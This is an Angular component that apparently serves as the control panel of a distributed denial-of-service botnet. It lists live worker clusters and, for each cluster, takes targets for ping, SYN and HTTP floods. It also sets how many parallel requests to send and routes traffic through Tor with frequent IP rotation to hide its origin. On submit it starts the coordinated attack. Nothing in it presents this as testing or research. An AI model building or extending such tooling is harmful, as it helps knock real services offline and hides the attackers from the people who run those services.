import { Component, OnInit } from '@angular/core';
import {FormBuilder, FormGroup} from "@angular/forms";
import {Worker} from "../../message-protocol/worker.model";
import {AttackOrchestration} from "../../message-protocol/attack-orchestration.model";
import {ClientService} from "../../services/client.service";
import {GoalAkio} from "../../message-protocol/goal-akio.model";
import {GoalHaru} from "../../message-protocol/goal-haru.model";
import {WorkerHaruSettings} from "../../message-protocol/worker-haru-settings.model";

@Component({
  selector: 'app-attack-start-multiple',
  templateUrl: './attack-start-multiple.component.html',
  styleUrls: ['./attack-start-multiple.component.css']
})
export class AttackStartMultipleComponent implements OnInit {
  formGroup: FormGroup;

  loadingWorkers: boolean = false;
  hasResultWorkers: boolean = false;
  hasErrorWorkers: boolean = false;
  listOfWorkers: Worker[] = [];
  listOfClusters: string[] = [];

  hasResultAttackStart: boolean = false;
  hasErrorAttackStart: boolean = false;

  constructor(private _formBuilder: FormBuilder, private _clientService: ClientService) {
    this.formGroup = this._formBuilder.group({})
  }

  ngOnInit(): void {
    this.loadWorkers();
  }

  loadWorkers() {
    this.hasResultWorkers = false;
    this.hasErrorWorkers = false;
    this.loadingWorkers = true;

    this._clientService.workersAlive().subscribe({
      next: (output: Worker[]) => {
        this.listOfWorkers = output;
        this.listOfClusters = Array.from(new Set(this.listOfWorkers.map(e => e.cluster_id)));
        this.buildForm();
        this.loadingWorkers = false;
        this.hasErrorWorkers = false;
        this.hasResultWorkers = true;
      },
      error: (err) => {
        this.loadingWorkers = false;
        this.hasResultWorkers = false;
        this.hasErrorWorkers = true;
      }
    });
  }

  buildForm(): void {
    for (let c of this.listOfClusters) {
      this.formGroup.addControl('ping_flood_target_ip_address_' + c, this._formBuilder.control(''))
      this.formGroup.addControl('syn_flood_target_ip_address_' + c, this._formBuilder.control(''))
      this.formGroup.addControl('syn_flood_target_port_' + c, this._formBuilder.control(443))
      this.formGroup.addControl('http_flood_target_urls_' + c, this._formBuilder.control(''))
      this.formGroup.addControl('parallel_min_requests_' + c, this._formBuilder.control(200))
      this.formGroup.addControl('parallel_max_requests_' + c, this._formBuilder.control(600))
      this.formGroup.addControl('proxy_type_' + c, this._formBuilder.control('tor'))
      this.formGroup.addControl('proxy_ip_change_frequency_' + c, this._formBuilder.control(6))
    }
  }

  onFormSubmit(): void {
    let goal_akio_by_cluster_id: Record<string, GoalAkio> = {};
    for (let cluster of this.listOfClusters) {
      goal_akio_by_cluster_id[cluster] = new GoalAkio({
        ping_flood_target_ip_address: this.formGroup.get('ping_flood_target_ip_address_' + cluster)?.value,
        syn_flood_target_ip_address: this.formGroup.get('syn_flood_target_ip_address_' + cluster)?.value,
        syn_flood_target_port: this.formGroup.get('syn_flood_target_port_' + cluster)?.value,
      })
    }

    let goal_haru_by_cluster_id: Record<string, GoalHaru> = {};
    for (let cluster of this.listOfClusters) {
      let http_flood_target_urls = this.formGroup.get('http_flood_target_urls_' + cluster)?.value.split("\n").filter((s: string) => s.length > 0)

      let worker_settings = new WorkerHaruSettings({
        parallel_min_requests: this.formGroup.get('parallel_min_requests_' + cluster)?.value,
        parallel_max_requests: this.formGroup.get('parallel_max_requests_' + cluster)?.value,
        proxy_type: this.formGroup.get('proxy_type_' + cluster)?.value,
        proxy_ip_change_frequency: this.formGroup.get('proxy_ip_change_frequency_' + cluster)?.value,
      });

      goal_haru_by_cluster_id[cluster] = new GoalHaru({
        http_flood_target_urls: http_flood_target_urls,
        worker_settings: worker_settings
      })
    }

    let attackOrchestration = new AttackOrchestration({
      goal_akio_by_cluster_id: goal_akio_by_cluster_id,
      goal_haru_by_cluster_id: goal_haru_by_cluster_id,
    });

    this._clientService.attackOrchestrationStart(attackOrchestration).subscribe({
      next: (output: boolean) => {
        this.hasResultAttackStart = true;
        setTimeout(() => {
          this.hasResultAttackStart = false;
        }, 5000);
      },

      error: (err) => {
        this.hasErrorAttackStart = true;
        setTimeout(() => {
          this.hasErrorAttackStart = false;
        }, 5000);
      }
    });
  }
}
